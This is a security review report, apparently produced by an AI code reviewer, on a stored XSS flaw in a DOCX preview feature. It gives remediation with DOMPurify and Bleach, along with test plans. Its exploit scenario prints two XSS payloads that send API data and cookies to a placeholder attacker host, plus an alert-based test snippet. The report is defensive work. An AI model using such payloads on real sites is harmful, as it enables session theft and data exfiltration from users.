# Security Review: AutoDocumentation Extension UI Overhaul

**Date:** 2026-05-27
**Branch:** ddl-bira-ignacio.ui_overhaul
**Reviewer:** Claude Code Security Analysis

## Executive Summary

A focused security review of the UI overhaul branch identified **1 HIGH severity vulnerability** that requires immediate remediation before merging to main. This vulnerability affects the document preview functionality and allows stored XSS attacks through malicious DOCX files.

**Total Findings:**
- HIGH severity: 1
- MEDIUM severity: 0
- LOW severity: 0
- False positives filtered: 5

---

## Vulnerability Details

### VULNERABILITY 1: XSS via Unvalidated Mammoth HTML Output

**Severity:** HIGH
**Confidence:** 8/10
**Category:** Stored XSS (DOM-based injection)

#### Description

The `/api/preview-doc` endpoint converts DOCX files to HTML using the Mammoth library without sanitization, then returns the HTML to the frontend. The frontend inserts this HTML directly into the DOM using `.innerHTML` without validation.

Critically, **Mammoth does not sanitize HTML output by design**. Per Mammoth's official documentation: "Mammoth performs no sanitisation of the source document, and should therefore be used extremely carefully with untrusted user input."

#### Affected Code

**Backend - Document Conversion (routes_api.py:589-618):**
```python
@app.get("/api/preview-doc")
async def api_preview_doc(request):
    run_id = request.query_params.get("runId", "").strip()
    # ...
    result = mammoth.convert_to_html(io.BytesIO(docx_bytes))
    return Response(
        json.dumps({"html": result.value, "ready": True}),
        media_type="application/json"
    )
```

**Frontend - Unsafe DOM Insertion (scripts.py:1365, 1406):**
```javascript
// Line 1365
if (content) {
    content.innerHTML = data.html;  // VULNERABLE - Mammoth output inserted without sanitization
    content.style.display = '';
}

// Line 1406
body.innerHTML = '<div class="doc-preview-content">' + data.html + '</div>';  // VULNERABLE
```

#### Exploit Scenario

1. **Attack Setup:** An attacker creates or modifies a DOCX file containing malicious JavaScript:
   - Embedded `<script>` tags in document structure
   - JavaScript URLs: `<a href="javascript:fetch('/api/jobs').then(r => r.json()).then(j => fetch('https://attacker.com/?data=' + btoa(JSON.stringify(j))))">`
   - Event handler attributes: `<img src=x onerror="fetch('https://attacker.com/?cookie=' + document.cookie)">`

2. **File Placement:** The malicious DOCX file is placed in the dataset at the expected location (e.g., via upload or during generation pipeline manipulation)

3. **Trigger:** User opens the documentation preview in the UI, which calls `/api/preview-doc`

4. **Exploitation:** Mammoth preserves the malicious HTML structures, the frontend inserts via `.innerHTML`, and JavaScript executes in the user's browser with full access to:
   - Session cookies and authentication tokens
   - CSRF capabilities against Domino API endpoints
   - DOM manipulation for phishing
   - Project data exfiltration through API calls

#### Impact

- **Confidentiality:** Attacker can steal authentication tokens, cookies, and access sensitive project data through the browser context
- **Integrity:** Attacker can modify DOM content, inject phishing forms, or perform CSRF attacks against Domino
- **Availability:** Attacker could manipulate the UI to cause denial of service for users viewing documentation

---

## Remediation Instructions

### SOLUTION: Sanitize HTML Before DOM Insertion

Two approaches are recommended, with **Option 1 (client-side DOMPurify)** being preferred for minimal backend changes:

#### Option 1: Client-Side Sanitization with DOMPurify (RECOMMENDED)

**Advantage:** Minimal changes, defense-in-depth approach, faster iteration
**Implementation Effort:** Low (2-3 hours)

##### Step 1: Add DOMPurify Dependency

**File:** `auto_model_docs/studio/scripts.py` (HTML template section)

Add DOMPurify CDN script to the main template that serves the frontend:

```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
```

Or for npm-based setup, install locally:
```bash
npm install dompurify
```

##### Step 2: Sanitize Mammoth Output Before DOM Insertion

**File:** `auto_model_docs/studio/scripts.py` - Update the JavaScript code in the MAIN_DOM_JS string

**Location 1 (Line ~1365):** In `_loadDocPreview()` function
```javascript
// BEFORE:
if (content) {
    content.innerHTML = data.html;
    content.style.display = '';
}

// AFTER:
if (content) {
    content.innerHTML = DOMPurify.sanitize(data.html, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'blockquote', 'a', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'div', 'span'],
        ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'id'],
        FORCE_BODY: true
    });
    content.style.display = '';
}
```

**Location 2 (Line ~1406):** In `_openLandingDocPreview()` function
```javascript
// BEFORE:
body.innerHTML = '<div class="doc-preview-content">' + data.html + '</div>';

// AFTER:
body.innerHTML = '<div class="doc-preview-content">' + 
    DOMPurify.sanitize(data.html, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'blockquote', 'a', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'div', 'span'],
        ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'id'],
        FORCE_BODY: true
    }) + 
    '</div>';
```

**Configuration Notes:**
- `ALLOWED_TAGS`: Common document formatting tags. Adjust based on expected Word document output
- `ALLOWED_ATTR`: Safe attributes for hyperlinks and images. Add more if Mammoth outputs additional styled content
- `FORCE_BODY`: Ensures DOMPurify treats fragments as body content

##### Step 3: Test the Fix

Create test cases in `tests/test_ui_components.py`:

```python
def test_preview_xss_protection_with_dompurify():
    """Verify that malicious HTML in preview is sanitized"""
    # This test verifies DOMPurify is active in browser
    # Use Chrome DevTools to verify:
    # 1. Open Developer Tools Console
    # 2. Check that DOMPurify object is available: typeof DOMPurify !== 'undefined'
    # 3. Create test DOCX with script tag
    # 4. Load preview, verify script doesn't execute
    pass

def test_mammoth_preserves_safe_formatting():
    """Verify that safe Word formatting is preserved after sanitization"""
    # Generate DOCX with bold, italic, links, tables
    # Load preview
    # Verify formatting is intact
    pass
```

#### Option 2: Server-Side Sanitization with Bleach (ALTERNATIVE)

**Advantage:** Centralized security policy, removes malicious content before sending to client
**Implementation Effort:** Medium (3-4 hours)

##### Step 1: Add Bleach Dependency

**File:** `auto_model_docs/pyproject.toml`

```toml
[project]
dependencies = [
    # ... existing dependencies ...
    "bleach>=6.0.0",  # HTML sanitization library
]
```

Install: `pip install bleach`

##### Step 2: Sanitize Mammoth Output Server-Side

**File:** `auto_model_docs/studio/routes_api.py` - Update `api_preview_doc()` function

```python
import bleach
from bleach.css_sanitizer import CSSSanitizer

@app.get("/api/preview-doc")
async def api_preview_doc(request):
    run_id = request.query_params.get("runId", "").strip()
    
    if not run_id:
        return Response("runId required", status_code=400)
    
    snap = request.session.get("snap")
    if not snap:
        return Response("Not authenticated", status_code=401)
    
    dataset_path = f"{get_layout().docs_dir}/model_docs_{run_id}.docx"
    docx_bytes = DatasetManager.read_file(snap, dataset_path)
    
    if not docx_bytes:
        return Response("Document not found", status_code=404)
    
    # Convert DOCX to HTML with Mammoth
    result = mammoth.convert_to_html(io.BytesIO(docx_bytes))
    html_output = result.value
    
    # SANITIZE: Remove any JavaScript or malicious HTML
    ALLOWED_TAGS = {
        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'ul', 'ol', 'li', 'blockquote', 'a', 'img', 'table', 'thead', 'tbody',
        'tr', 'th', 'td', 'div', 'span', 'hr', 'pre', 'code'
    }
    ALLOWED_ATTRS = {
        'a': ['href', 'title'],
        'img': ['src', 'alt', 'title'],
        '*': ['class', 'id']
    }
    
    sanitized_html = bleach.clean(
        html_output,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True
    )
    
    return Response(
        json.dumps({"html": sanitized_html, "ready": True}),
        media_type="application/json"
    )
```

##### Step 3: Test the Fix

Add backend test in `tests/test_routes.py`:

```python
def test_preview_doc_sanitizes_malicious_html():
    """Verify that malicious HTML is removed before being returned"""
    # Create DOCX with script tags
    # Call /api/preview-doc
    # Verify response.json()["html"] does NOT contain <script> tags
    # Verify response does NOT contain javascript: URLs
    pass
```

### Recommended Implementation Path

**Priority:** HIGH - Fix before merging to main

**Suggested Timeline:**
1. **Day 1:** Implement Option 1 (DOMPurify client-side) - faster, less risky
2. **Day 2:** Add tests, verify in Chrome DevTools that XSS payloads are blocked
3. **Day 3:** Code review, merge to main

**If planning Option 2 (Bleach):**
1. Add bleach dependency and update pyproject.toml
2. Implement server-side sanitization in routes_api.py
3. Add backend tests
4. Verify with malicious DOCX test files
5. Deploy and monitor

### Testing the Fix

#### Manual Testing Steps

1. **Create a Test DOCX with XSS Payload:**
   ```python
   from docx import Document
   doc = Document()
   doc.add_paragraph('<script>alert("XSS")</script>')
   doc.save("test_xss.docx")
   ```

2. **Upload or Place the File:**
   - Upload via template editor or
   - Place in dataset at expected path

3. **Open Preview in Browser:**
   - Open Chrome Developer Tools (F12)
   - Go to Console tab
   - Preview the document
   - Verify no alert() is triggered
   - Verify no errors in console

4. **Verify Safe Content Still Works:**
   - Generate a legitimate documentation
   - Open preview
   - Verify formatting (bold, italic, headers, tables) is intact
   - Verify links are clickable

#### Automated Testing

Add to test suite:
```python
def test_xss_payload_in_docx_is_sanitized():
    """Ensure XSS payloads in DOCX are not executed"""
    # Create DOCX with various XSS vectors
    # Call preview endpoint
    # Assert malicious content is removed
    # Assert legitimate formatting is preserved
```

---

## Summary & Next Steps

**Action Required:**
1. Implement HTML sanitization (Option 1 or 2 above)
2. Add test cases to verify the fix
3. Manually test with malicious DOCX files
4. Update CHANGELOG with security fix note
5. Request security review before merging to main

**Files to Modify:**
- `auto_model_docs/studio/scripts.py` (add DOMPurify sanitization calls)
- `auto_model_docs/pyproject.toml` (if using Option 2: add bleach dependency)
- `auto_model_docs/studio/routes_api.py` (if using Option 2: add server-side sanitization)
- `tests/test_ui_components.py` and/or `tests/test_routes.py` (add tests)

**Estimated Effort:** 2-4 hours depending on approach chosen

**Risk Level if Not Fixed:** HIGH - Active vulnerability allowing XSS attacks via malicious DOCX files

---

## Appendix: False Positives Filtered

The following claims were investigated and determined to be false positives:

1. **Path Traversal in api_preview_doc via run_id** - FILTERED
   - run_id comes from DOMINO_RUN_ID environment variable (hex string)
   - Per security precedents, environment variables from trusted infrastructure are not attack vectors
   - Hex strings (24-hex format) are inherently safe for filesystems

2. **Unsafe HTML Restoration in Template Preview** - FILTERED
   - This is a secondary effect of the Mammoth XSS vulnerability
   - Only relevant if primary XSS is exploitable (which it is, hence the HIGH finding above)
   - Once Mammoth output is sanitized, this code path is safe

3. **Unvalidated run_id in Filename** - FILTERED
   - run_id is hex string from Domino backend
   - Hex characters [0-9a-f] are safe for all filesystems
   - No risk of special character injection

4. **Path Traversal in api_built_in_template_sections** - FILTERED
   - Validation uses split("/")[-1] to extract filename component
   - Extension whitelist (.yaml, .yml) prevents accessing non-template files
   - Built-in templates are in restricted application directory
   - Path traversal attempts fail the extension check

5. **Denial of Service via Resource Exhaustion** - EXCLUDED
   - Reviewed and excluded per security review rules (DOS vulnerabilities are not reported)

